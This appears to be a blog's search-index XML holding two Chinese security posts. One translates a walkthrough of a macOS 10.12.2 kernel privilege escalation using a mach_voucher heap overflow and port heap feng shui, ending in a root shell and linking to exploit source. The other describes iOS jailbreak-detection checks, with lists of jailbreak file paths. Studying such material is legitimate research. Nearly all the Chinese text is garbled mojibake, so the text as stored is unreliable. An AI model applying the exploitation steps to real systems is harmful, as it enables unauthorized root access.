<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Twe-Blog]]></title>
      <url>http://Hello-Sherlock.github.io/2017/05/19/twe-Blog/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Ele-Blog]]></title>
      <url>http://Hello-Sherlock.github.io/2017/05/19/ele-Blog/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Ten-Blog]]></title>
      <url>http://Hello-Sherlock.github.io/2017/05/19/ten-Blog/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ã€ç¿»è¯‘ã€‘macOS 10.12.2æœ¬åœ°ææƒå’ŒXNU Portå †é£æ°´]]></title>
      <url>http://Hello-Sherlock.github.io/2017/04/17/night-Blog/</url>
      <content type="html"><![CDATA[<blockquote>
<p>è¿™ç¯‡æ–‡ç« æ˜¯è’¸ç±³å¤§ç¥åœ¨é˜¿é‡Œèšå®‰å…¨å‘çš„ä¸€ç¯‡æœ‰å…³xnuå †é£æ°´çš„æ–‡ç« ï¼Œç”±äºåªå‘äº†è‹±æ–‡ç‰ˆï¼Œè¿™é‡Œæ¥ç¿»è¯‘ä¸‹ï¼Œå†åŠ æ·±ä¸€ä¸‹è¿™æ–¹é¢çš„çŸ¥è¯†^_^</p>
</blockquote>
<p>åŸæ–‡åœ¨è¿™é‡Œ<a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.19.eXT850&amp;articleid=781" target="_blank" rel="external">https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.19.eXT850&amp;articleid=781</a></p>
<h2 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h2><p>ä»yalu 10.2ï¼Œæˆ‘ä»¬å¯ä»¥å­¦åˆ°å¾ˆå¤šæ–°çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯XNUå †é£æ°´å’Œç»•è¿‡å†…æ ¸ä¿æŠ¤ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºXNUå †é£æ°´çš„æŠ€æœ¯ç»†èŠ‚ï¼Œå¹¶é€šè¿‡è¯¥æŠ€æœ¯ä½¿macOSè·å¾—rootæƒé™ã€‚æœ€åä½†å¹¶ä¸æ˜¯æœ€é‡è¦çš„ï¼Œæ¼æ´æºç å¯ä»¥ä»ä»¥ä¸‹ç½‘å€ä¸‹è½½ï¼š<br><a href="https://github.com/zhengmin1989/macOS-10.12.2-Exp-via-mach_voucher" target="_blank" rel="external">https://github.com/zhengmin1989/macOS-10.12.2-Exp-via-mach_voucher</a></p>
<h2 id="0x01-å†…æ ¸å †æ ˆæº¢å‡º"><a href="#0x01-å†…æ ¸å †æ ˆæº¢å‡º" class="headerlink" title="0x01 å†…æ ¸å †æ ˆæº¢å‡º"></a>0x01 å†…æ ¸å †æ ˆæº¢å‡º</h2><p>é€šè¿‡XNUå †é£æ°´åœ¨macOS 10.12ä¸­è·å¾—rootæƒé™ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå†…æ ¸æ¼æ´ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬é€‰æ‹©<code>mach_voucher</code>å †æº¢å‡ºä½œä¸ºä¾‹å­ï¼Œ<code>Mach_voucher_extract_attr_recipe_trap()</code>æ˜¯å¯ä»¥åœ¨æ²™ç®±å†…è°ƒç”¨çš„Maché™·é˜±ï¼Œè¿™æ˜¯åœ¨iOS 10å’ŒmacOS 10.12ä¸­æ·»åŠ çš„æ–°åŠŸèƒ½ï¼Œä½†æ˜¯ä»–æœ‰ä¸€ä¸ªå¯æ€•çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/d71rt073i56.png" alt="d71rt073i56.png"></p>
<p>åœ¨å‡½æ•°ä¸­ï¼Œ<code>args-&gt;recipe_size</code>æ˜¯ä¸€ä¸ªæŒ‡å‘æ•´æ•°çš„ç”¨æˆ·æ€æŒ‡é’ˆï¼Œæ‰€ä»¥<code>mach_voucher_extract_attr_recipe_trap()</code>é€šè¿‡<code>copyin()</code>å°†sizeçš„å€¼ä»ç”¨æˆ·æ€æ‹·è´åˆ°å†…æ ¸ï¼Œ ç„¶åèµ‹å€¼ç»™sz.</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446in89rqbm0.png" alt="446in89rqbm0.png"></p>
<p>è¯¥å‡½æ•°ç„¶åä½¿ç”¨szå€¼åœ¨å†…æ ¸å †ä¸Šåˆ†é…ä¸€ä¸ªå†…å­˜å—ã€‚ä½†æ˜¯ï¼Œå¼€å‘äººå‘˜å¿˜è®°äº†args-&gt; recipe_sizeæ˜¯ä¸€ä¸ªç”¨æˆ·æ€æŒ‡é’ˆï¼Œäºæ˜¯ä½¿å®ƒåœ¨<code>copyin()</code>ä¸­ä½œä¸ºä¸€ä¸ªå€¼ï¼Œ æˆ‘ä»¬çŸ¥é“ç”¨æˆ·æ€æŒ‡é’ˆå¯èƒ½å¤§äºszå€¼ï¼Œè¿™å°†å¯¼è‡´å†…æ ¸å †ä¸­çš„ç¼“å†²åŒºæº¢å‡ºã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è¦åœ¨è¯¥åœ°å€ä¸Šåˆ†é…ä¸€ä¸ªå†…å­˜å—ï¼Œæˆ‘ä»¬å¯èƒ½æ— æ³•æ§åˆ¶ç”¨æˆ·æ€æŒ‡é’ˆçš„åœ°å€ã€‚ä½†è¿™ä¸æ˜¯é—®é¢˜ã€‚å¦‚æœé‡åˆ°æœªæ˜ å°„çš„å†…å­˜ï¼Œ<code>copyinï¼ˆï¼‰</code>å‡½æ•°ä¼šè‡ªåŠ¨åœæ­¢ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é«˜åœ°å€ä¸Šåˆ†é…ä¸€ä¸ªå†…å­˜å—ï¼Œç„¶åå–æ¶ˆæ˜ å°„å…¶ä½™çš„å†…å­˜å—æ¥æ§åˆ¶æº¢å‡ºæ•°æ®ã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ina2jpor0.png" alt="446ina2jpor0.png"></p>
<h2 id="0x02-é€šè¿‡portè¿›è¡Œå †é£æ°´"><a href="#0x02-é€šè¿‡portè¿›è¡Œå †é£æ°´" class="headerlink" title="0x02 é€šè¿‡portè¿›è¡Œå †é£æ°´"></a>0x02 é€šè¿‡portè¿›è¡Œå †é£æ°´</h2><p>åœ¨iOS 10å’ŒmacOS 10.12ä¸­ï¼Œè‹¹æœæ·»åŠ äº†ä¸€ä¸ªæ–°çš„ç¼“è§£æœºåˆ¶ï¼Œä»¥æ£€æŸ¥æ˜¯å¦é‡Šæ”¾äº†é”™è¯¯çš„åŒºåŸŸæ”»å‡»ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ä½¿ç”¨ç»å…¸çš„<code>vm_map_copy</code>ï¼ˆæ›´æ”¹<code>vm_map_size</code>ï¼‰æŠ€æœ¯æ¥æ‰§è¡Œå †é£æ°´ã€‚</p>
<p>æ­¤å¤–ï¼Œè‹¹æœåœ¨iOS 9.2å’ŒmacOS 10.11ä¸­æ·»åŠ äº†ä¸€ä¸ªfreelistéšæœºåŒ–æœºåˆ¶ï¼Œæˆ‘ä»¬ä¸èƒ½è½»æ˜“åœ°é¢„<br>æµ‹é‡æ–°åˆ†é…çš„å†…å­˜å—çš„ä½ç½®ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ–°çš„å †é£æ°´æŠ€æœ¯ã€‚</p>
<p>åœ¨Yalu 10.2ä¸­ï¼Œ<code>qwertyoruiop</code>ä½¿ç”¨<code>OOL_PORTS</code>è·å–å¯ç”¨äºæ‰§è¡Œä»»æ„å†…æ ¸å†…å­˜è¯»å†™çš„å†…æ ¸ä»»åŠ¡ç«¯å£ã€‚ è¿™ç§æŠ€æœ¯ç»•è¿‡äº†XNUå †ä¸­çš„æ‰€æœ‰ç¼“è§£æœºåˆ¶ã€‚åœ¨æœ¬èŠ‚çš„å…¶ä½™éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†è®¨è®ºè¿™ç§æŠ€æœ¯çš„ç»†èŠ‚ã€‚</p>
<p><code>Mach msg</code>æ˜¯XNUä¸­æœ€å¸¸ç”¨çš„IPCæœºåˆ¶ï¼Œå¤§é‡æ¶ˆæ¯é€šè¿‡â€œå¤æ‚çš„æ¶ˆæ¯â€å‘é€ã€‚é€šè¿‡<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>è¿™ç§<code>msg_type</code>çš„â€œå¤æ‚æ¶ˆæ¯â€ï¼Œæˆ‘ä»¬å¯ä»¥å‘å†…æ ¸å‘é€out-of-lineç«¯å£ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å‘é€äº†32ä¸ª<code>MACH_PORT_DEAD</code> oolç«¯å£ï¼ˆ32 * 8å­—èŠ‚=0x100å­—èŠ‚ï¼‰åˆ°å†…æ ¸çš„kalloc.256åŒºåŸŸã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/42423423.png" alt="42423423.png"></p>
<p>ä¿å­˜åœ¨mach msgä¸­çš„oolç«¯å£æ˜¯<code>ipc_object</code>æŒ‡é’ˆï¼ŒæŒ‡é’ˆå¯ä»¥æŒ‡å‘ç”¨æˆ·æ€åœ°å€ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>mach_voucher</code>æ¼æ´æ¥æº¢å‡ºè¿™äº›æŒ‡é’ˆï¼Œå¹¶åœ¨ç”¨æˆ·æ€ä¸‹ä¿®æ”¹ä¸€ä¸ª<code>ipc_object</code>æŒ‡é’ˆç”¨æ¥æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„<code>ipc_object</code>ã€‚ å¦å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ç”¨æˆ·æ€ä¼ªé€ çš„fake portä¸‹åˆ›å»ºä¸€ä¸ªfake taskã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/31231313.png" alt="31231313.png"></p>
<p>ä¸ºäº†ä¿è¯æº¢å‡ºæ­£ç¡®çš„<code>ipc_object</code>æŒ‡é’ˆï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›å †é£æ°´ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å‘å†…æ ¸å‘é€å¤§é‡çš„oolç«¯å£æ¶ˆæ¯ï¼Œä»¥ç¡®ä¿æ–°åˆ†é…çš„å†…å­˜å—æ˜¯è¿ç»­çš„ã€‚ ç„¶åæˆ‘ä»¬åœ¨ä¸­é—´æ”¶åˆ°ä¸€äº›æ¶ˆæ¯æ¥æŒ–æ˜ä¸€äº›æ§½ã€‚ ç„¶åæˆ‘ä»¬å†æ¬¡å‘é€ä¸€äº›æ¶ˆæ¯ï¼Œä½¿æº¢å‡ºç‚¹åœ¨æ§½çš„ä¸­é—´ã€‚ æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨<code>mach_voucher</code>åœ¨æº¢å‡ºç‚¹è§¦å‘å †æº¢å‡ºã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ip2ru4i90.png" alt="446ip2ru4i90.png"></p>
<p>æº¢å‡ºä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ”¶åˆ°å…¶ä»–machæ¶ˆæ¯ï¼Œä»¥æ‰¾åˆ°æŸåçš„ç«¯å£ï¼ˆä¸æ˜¯<code>MACH_PORT_DEAD</code>ç«¯å£ï¼‰ã€‚<br><img src="http://oh5mz2415.bkt.clouddn.com/446ip41tfpa0.png" alt="446ip41tfpa0.png"></p>
<h2 id="0x03-å†…æ ¸å†…å­˜ä»»æ„è¯»å†™"><a href="#0x03-å†…æ ¸å†…å­˜ä»»æ„è¯»å†™" class="headerlink" title="0x03 å†…æ ¸å†…å­˜ä»»æ„è¯»å†™"></a>0x03 å†…æ ¸å†…å­˜ä»»æ„è¯»å†™</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†ä¼ªé€ çš„<code>ipc_object</code>çš„<code>io_bits</code>è®¾ç½®ä¸º<code>IKOT_CLOCK</code>ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>clock_sleep_trapï¼ˆï¼‰</code>éå†å†…æ ¸æ¥è·å–å†…æ ¸ä¸­<code>clock_task</code>çš„åœ°å€ã€‚ è¿™ä¸ªåœ°å€å°†å¸®åŠ©æˆ‘ä»¬ç¨åæ‰¾åˆ°å†…æ ¸æ•°æ®ã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ipedl1v50.png" alt="446ipedl1v50.png"></p>
<p>ç„¶åæˆ‘ä»¬å°†ä¼ªé€ çš„<code>ipc_object</code>çš„<code>io_bits</code>è®¾ç½®ä¸º<code>IKOT_TASK</code>ï¼Œå°†fakeportçš„taskæŒ‡å‘ä¼ªé€ çš„faketaskã€‚ é€šè¿‡å°†å€¼è®¾ç½®ä¸ºfaketask + 0x380ï¼ˆåœ¨arm64ä¸­ä¸º0x360ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>pid_for_taskï¼ˆï¼‰</code>è¯»å–ä»»æ„32ä½å†…æ ¸å†…å­˜ã€‚ è¿™æ˜¯ä»¤äººåƒæƒŠçš„ï¼Œå› ä¸ºè¯¥å‡½æ•°ä¸æ£€æŸ¥taskçš„æœ‰æ•ˆæ€§ï¼Œåªè¿”å›<em>ï¼ˆ</em>ï¼ˆfaketask + 0x380ï¼‰+ 0x10ï¼‰çš„å€¼ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ²¡æœ‰ä»»ä½•å°å·¥å…·å’ŒROPçš„æƒ…å†µä¸‹è·å¾—å¯é æ€§å†…æ ¸è¯»å–ã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ipg2vp590.png" alt="446ipg2vp590.png"><br><img src="http://oh5mz2415.bkt.clouddn.com/446iph1n7mf0.png" alt="446iph1n7mf0.png"></p>
<p>é€šè¿‡<code>clock task</code>æ³„éœ²çš„å†…æ ¸åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å†…å­˜ä¸­æœç´¢å†…æ ¸é•œåƒçš„é­”æ•°ï¼Œæ‰¾åˆ°kslideã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ipi9j31o0.png" alt="446ipi9j31o0.png"></p>
<p>è·å–å†…æ ¸åŸºç¡€åï¼Œæˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰è¿›ç¨‹æ¥æŸ¥æ‰¾å†…æ ¸<code>ipc_object</code>å’Œå†…æ ¸ä»»åŠ¡ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥<code>dump</code>å‡ºæ¥å†…æ ¸çš„<code>ipc_object</code>ä»¥åŠå†…æ ¸è¿›ç¨‹çš„taskæ•°æ®å¹¶èµ‹å€¼ç»™fake portã€‚é€šè¿‡å¯¹æˆ‘ä»¬çš„ä¼ªé€ çš„<code>ipc_object</code>å’Œtaskä½¿ç”¨<code>task_get_special_portï¼ˆï¼‰</code>ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—å†…æ ¸ä»»åŠ¡ç«¯å£ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå†…æ ¸ä»»åŠ¡ç«¯å£éå¸¸å¼ºå¤§ã€‚å®ƒå¯ä»¥ç”¨äºé€šè¿‡<code>mach_vm_readï¼ˆ</code>ï¼‰å’Œ<code>mach_vm_writeï¼ˆï¼‰</code>è¿›è¡Œä»»æ„å†…æ ¸å†…å­˜è¯»å†™ã€‚</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ipjo49820.png" alt="446ipjo49820.png"></p>
<h2 id="0x04-rootææƒ"><a href="#0x04-rootææƒ" class="headerlink" title="0x04 rootææƒ"></a>0x04 rootææƒ</h2><p>æ¯ä¸ªè¿›ç¨‹çš„å‡­æ®ä¿¡æ¯ï¼Œ<code>posix_cred</code>ç»“æ„å­˜å‚¨åœ¨å†…æ ¸å†…å­˜ä¸­ã€‚æˆ‘ä»¬é¦–å…ˆéœ€è¦æ‰¾åˆ°æˆ‘ä»¬çš„è¿›ç¨‹ä¿¡æ¯ï¼ˆä»å†…æ ¸base + allprocï¼‰ï¼Œç„¶åæ‰¾åˆ°æˆ‘ä»¬çš„exploitè¿›ç¨‹çš„<code>posix_cred</code>ç»“æ„æ•°æ®ã€‚ ä¹‹åï¼Œæˆ‘ä»¬é€šè¿‡<code>kernel_task_port</code>ä½¿ç”¨<code>mach_vm_writeï¼ˆ</code>ï¼‰å°†<code>cr_ruid</code>ï¼ˆå®é™…ç”¨æˆ·IDï¼‰å€¼è®¾ç½®ä¸º0ï¼ˆè¿™æ„å‘³ç€å°†è¿›ç¨‹çš„uidå˜æˆäº†rootï¼‰ã€‚æœ€åä½†å¹¶ä¸æ˜¯æœ€é‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨systemï¼ˆâ€œ/ bin / bashâ€ï¼‰è·å–æ ¹shellï¼</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/446ipm366tr0.png" alt="446ipm366tr0.png"></p>
<h2 id="0x05-æ‘˜è¦"><a href="#0x05-æ‘˜è¦" class="headerlink" title="0x05 æ‘˜è¦"></a>0x05 æ‘˜è¦</h2><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨<code>mach_voucher</code>å †æº¢å‡ºå’Œå †é£æ°´æ¥å®ç°macOS 10.12.2ä¸Šçš„æœ¬åœ°ææƒã€‚æ¼æ´æºç å¯ä»¥ä»ä»¥ä¸‹ç½‘å€ä¸‹è½½ï¼š</p>
<p><a href="https://github.com/zhengmin1989/macOS-10.12.2-Exp-via-mach_voucher" target="_blank" rel="external">https://github.com/zhengmin1989/macOS-10.12.2-Exp-via-mach_voucher</a></p>
<h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><ol>
<li>Yalu 102: <a href="https://github.com/kpwn/yalu102" target="_blank" rel="external">https://github.com/kpwn/yalu102</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1004" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1004</a></li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> XNU </tag>
            
            <tag> macOS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å¸¸è§çš„iOSåº”ç”¨å®‰å…¨æ£€æµ‹(æ•´ç†)]]></title>
      <url>http://Hello-Sherlock.github.io/2017/03/22/eight-Blog/</url>
      <content type="html"><![CDATA[<blockquote>
<p>å¯¹åº”ç”¨çš„å®‰å…¨æ€§é˜²æŠ¤æœ‰è¶Šç‹±æ£€æµ‹ã€æ³¨å…¥æ£€æµ‹ã€è°ƒè¯•æ£€æµ‹ï¼Œå‡½æ•°åæ›¿æ¢ã€ä»£ç é€»è¾‘æ··æ·†ç­‰ï¼Œé‚£ä¹ˆå¯¹äºå®‰å…¨ç ”ç©¶äººå‘˜æ¥è¯´ï¼Œæ²¡æœ‰ä¸¥æ ¼æ„ä¹‰ä¸Šçš„é˜²çˆ†æ­»å®ˆï¼Œåªè¦æ˜¯åº”ç”¨ï¼Œä»–å°±ä¼šæœ‰è¢«æ”»å‡»çš„ç‚¹ï¼Œé‚£ä¹ˆä¸ºäº†æœ‰æ•ˆåœ°ã€ä¸€å®šç¨‹åº¦ä¸Šåœ°å¯¹åº”ç”¨è¢«é€†å‘åˆ†æç ´è§£é€ æˆä¸€äº›å›°æ‰°ï¼Œæœ€å¥½æ˜¯<del>åšå…¨å¥—</del>ï¼Œé‚£ä¹ˆè¿™ç¯‡æ–‡ç« ç®€å•çš„è®°å½•ä¸€äº›å¸¸è§çš„è¶Šç‹±ã€æ³¨å…¥ç­‰çš„æ£€æµ‹ä»¥åŠä¸€äº›å¾ˆå¸¸è§çš„antiåè°ƒè¯•</p>
</blockquote>
<a id="more"></a>
<h1 id="è¶Šç‹±æ£€æµ‹"><a href="#è¶Šç‹±æ£€æµ‹" class="headerlink" title="è¶Šç‹±æ£€æµ‹"></a>è¶Šç‹±æ£€æµ‹</h1><h2 id="0x0-dyld-image-count-amp-amp-dyld-get-image-name"><a href="#0x0-dyld-image-count-amp-amp-dyld-get-image-name" class="headerlink" title="0x0 _dyld_image_count&amp;&amp;_dyld_get_image_name"></a>0x0 <code>_dyld_image_count</code>&amp;&amp;<code>_dyld_get_image_name</code></h2><p><code>- _dyld_image_count</code>è¿”å›dyldæ˜ å°„çš„å½“å‰çš„imageæ•°<br><code>- _dyld_get_image_name</code>è¿”å›imageåç§°ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥æ£€ç´¢dyldçš„imageåç§°</p>
<p>å¯ä»¥é€šè¿‡æ£€æµ‹ç›®å½•ä¸­æ˜¯å¦æœ‰MobileSubstrate.dylibæ¥ç¡®è®¤æ˜¯å¦è¶Šç‹±</p>
<pre><code>void dylibCheck() {
uint32_t count = _dyld_image_count();
char *substrate = &quot;/Library/MobileSubstrate/MobileSubstrate.dylib&quot;;
for(uint32_t i = 0; i &lt; count; i++) {
const char *dyld = _dyld_get_image_name(i);
if (strcmp(dyld,substrate)==0) { 
NSLog(@&quot;è¯¥è®¾å¤‡å·²è¶Šç‹±&quot;); 
        }
    } 
}
</code></pre><h2 id="0x1-fork"><a href="#0x1-fork" class="headerlink" title="0x1  fork"></a>0x1  fork</h2><p>fork()å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œç”±äºåœ¨éè¶Šç‹±è®¾å¤‡ä¸Šä¸èƒ½å¤Ÿä½¿ç”¨fork()ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥åªèƒ½åœ¨è¶Šç‹±è®¾å¤‡ä¸Šä½¿ç”¨</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> pid = fork();</div><div class="line"><span class="keyword">if</span>(pid&gt;=<span class="number">0</span>) &#123; NSLog(@â€Jailbrokenâ€); &#125;</div></pre></td></tr></table></figure>
<h2 id="0x2-URL-scheme"><a href="#0x2-URL-scheme" class="headerlink" title="0x2  URL scheme"></a>0x2  URL scheme</h2><p>å¤§éƒ¨åˆ†è¶Šç‹±è®¾å¤‡éƒ½ä¼šå®‰è£…Cydiaï¼Œå½“å®‰è£…Cydiaæ—¶ä¼šåœ¨è®¾å¤‡ä¸Šæ³¨å†Œä¸€ä¸ªURL scheme,æ‰€ä»¥æœ‰ä¸€ç§æ£€æµ‹æ–¹æ¡ˆæ˜¯ä»åº”ç”¨ç¨‹åºè°ƒç”¨Cydiaçš„URL schemeå¹¶æ£€æŸ¥æ˜¯å¦è¿”å›æˆåŠŸã€‚</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[NSURL <span class="string">URLWithString:</span>@â€<span class="string">cydia:</span><span class="comment">//package/com.example.packageâ€]</span></div></pre></td></tr></table></figure>
<h2 id="0x3-opendir"><a href="#0x3-opendir" class="headerlink" title="0x3 opendir()"></a>0x3 opendir()</h2><p>ä½¿ç”¨opendir()è¿›è¡Œç‰¹å®šç›®å½•çš„è®¿é—®ï¼Œ å¹¶è¿”å›ä¸ä¹‹ç›¸å…³è”çš„ç›®å½•æµï¼Œåœ¨GDæ¡†æ¶è¿è¡Œ<code>opendir(/dev)</code>å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è®¿é—®/devç›®å½•ï¼Œä»¥æ­¤åˆ¤æ–­è®¾å¤‡æ˜¯å¦è¶Šç‹±å› ä¸ºåœ¨éè¶Šç‹±è®¾å¤‡ä¸Šå°†è¿”å›NULL</p>
<h2 id="0x4-stat-amp-amp-lstat"><a href="#0x4-stat-amp-amp-lstat" class="headerlink" title="0x4 stat() &amp;&amp; lstat()"></a>0x4 stat() &amp;&amp; lstat()</h2><p>stat() &amp;&amp; lstat()æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»–ä»¬æ¥åˆ¤æ–­æ˜¯å¦å®‰è£…äº†ä»¥ä¸‹ä¸€éƒ¨åˆ†å¸¸ç”¨è¶Šç‹±å·¥å…·<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/<span class="keyword">private</span>/var/stash</div><div class="line">/<span class="keyword">private</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">apt</span></span></div><div class="line">/<span class="keyword">private</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">cydia</span></span></div><div class="line">/usr/libexec/cydia</div><div class="line">/Applications/Icy.app</div><div class="line">/bin/bash</div><div class="line">/<span class="keyword">private</span>/var/tmp/cydia.log</div><div class="line">/usr/libexec/sftp-server</div><div class="line">/Applications/Loader.app</div><div class="line">/Applications/Cydia.app</div><div class="line">/usr/sbin/sshd</div><div class="line"></div><div class="line">......</div></pre></td></tr></table></figure></p>
<p>å½“ç„¶è¿˜æœ‰fopenå’ŒNSFileManager</p>
<h2 id="0x5-Symbolic-Link"><a href="#0x5-Symbolic-Link" class="headerlink" title="0x5 Symbolic Link"></a>0x5 Symbolic Link</h2><p>é€šè¿‡Symbolic Linkæˆ‘ä»¬å¯ä»¥æ¥æ£€æŸ¥ä¸€äº›ç‰¹æ®Šçš„é“¾æ¥ä»è€Œåˆ¤æ–­æ˜¯å¦è¢«è¶Šç‹±</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/Applications</div><div class="line"><span class="regexp">/var/</span>stash<span class="regexp">/Library/</span>Ringtones</div><div class="line"><span class="regexp">/var/</span>stash<span class="regexp">/usr/</span>include</div><div class="line"><span class="regexp">/var/</span>stash<span class="regexp">/Library/</span>Wallpaper</div><div class="line"><span class="regexp">/var/</span>stash<span class="regexp">/usr/</span>libexec</div><div class="line"><span class="regexp">/var/</span>stash<span class="regexp">/usr/</span>share</div><div class="line"><span class="regexp">/var/</span>stash<span class="regexp">/usr/</span>arm-apple-darwin9</div></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">struct <span class="keyword">stat</span> <span class="keyword">s</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">lstat</span>(<span class="string">"/Applications"</span>, &amp;<span class="keyword">s</span>) != <span class="number">0</span>) &#123;</div><div class="line"><span class="keyword">if</span>(s.st_mode &amp; S_IFLNK) &#123; NSLog(@â€Jailbrokenâ€);</div><div class="line">&#125; &#125;</div></pre></td></tr></table></figure>
<h1 id="åŠ¨æ€æ£€æµ‹"><a href="#åŠ¨æ€æ£€æµ‹" class="headerlink" title="åŠ¨æ€æ£€æµ‹"></a>åŠ¨æ€æ£€æµ‹</h1><blockquote>
<p>åŠ¨æ€è°ƒè¯•æ˜¯é€†å‘å·¥ç¨‹å’Œåˆ†æå„ç§å¹³å°è½¯ä»¶çš„å¸¸è§æ–¹æ³•ï¼Œä»–å¯ä»¥å…è®¸æ”»å‡»è€…æ§åˆ¶å’Œä¿®æ”¹è¿è¡Œæ—¶çš„å±€éƒ¨å˜é‡æˆ–è€…å¯¹ç›®æ ‡å‡½æ•°è¿›è¡Œè·Ÿè¸ªè°ƒè¯•ä»¥ä¾¿è¾¾åˆ°è‡ªå·±çš„ä¸€äº›ç›®çš„ã€‚<br>å½“ç„¶å‡ºäºä¿æŠ¤æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºç»™æ”»å‡»è€…åœ¨ä¸€å®šç¨‹åº¦ä¸Šé€ æˆä¸€äº›é˜»ç¢ï¼Œæˆ‘ä»¬æœ‰ä¸€äº›å¸¸è§„çš„æ‰‹æ®µæ¥æ£€æµ‹å®ƒä»¬(ps:å¸¸è§„çš„ä¸€äº›æ£€æµ‹å¦‚æœæ‡‚åŸç†çš„è¯å½“ç„¶å¾ˆå¥½ç»•è¿‡soæ”»ä¸é˜²å¯ä»¥äº’ç›¸è¿›æ­¥ğŸ™„)</p>
</blockquote>
